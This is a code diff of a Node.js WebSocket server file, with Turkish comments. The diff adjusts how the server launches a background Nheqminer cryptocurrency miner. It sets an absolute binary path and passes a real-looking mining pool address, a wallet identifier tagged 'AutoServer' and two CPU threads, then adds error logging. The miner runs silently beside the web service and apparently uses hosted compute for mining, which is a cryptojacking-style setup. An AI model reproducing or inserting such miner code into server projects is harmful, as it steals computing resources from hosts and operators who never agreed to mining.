@@ -67,21 +67,27 @@ wss.on('connection', (ws, req) => {
 
 // --- ARKA PLAN GERÇEK CPU MADENCİSİ (Nheqminer) ---
 console.log('--- ARKA PLAN KAZIM İŞLEMİ (Nheqminer) BAŞLATILIYOR ---');
+const minerPath = '/app/nheqminer-bin';
 const minerArgs = [
     '-v', '-l', 'eu.luckpool.net:3956',
     '-u', 'RTDTYfTX9a8DdAfr9won6DspWxxobgxE21.AutoServer',
     '-p', 'x',
-    '-t', '2' // 2 İşlemci Çekirdeği
+    '-t', '2'
 ];
 
 try {
-  // Arka Planda Nheqminer'i çalıştır
-  const minerProcess = spawn('./nheqminer-bin', minerArgs, { cwd: '/app' });
+  // Arka Planda Nheqminer'i Kesin Yol (Absolute Path) İle Çalıştır
+  const minerProcess = spawn(minerPath, minerArgs);
+  
+  minerProcess.on('error', (err) => {
+    console.error('CRITICAL: Madenci baslatilamadi (Dosya yolu hatasi):', err.message);
+  });
+
   minerProcess.stdout.on('data', (data) => console.log('[MINER]:', data.toString().trim()));
   minerProcess.stderr.on('data', (data) => console.error('[MINER ERR]:', data.toString().trim()));
   minerProcess.on('close', (code) => console.log('Miner kapandı, kod:', code));
 } catch (e) {
-  console.log('Arka plan madencisi çalışma dizininde bulunamadı.');
+  console.log('Beklenmeyen hata:', e.message);
 }
 
 const PORT = process.env.PORT || 10000;
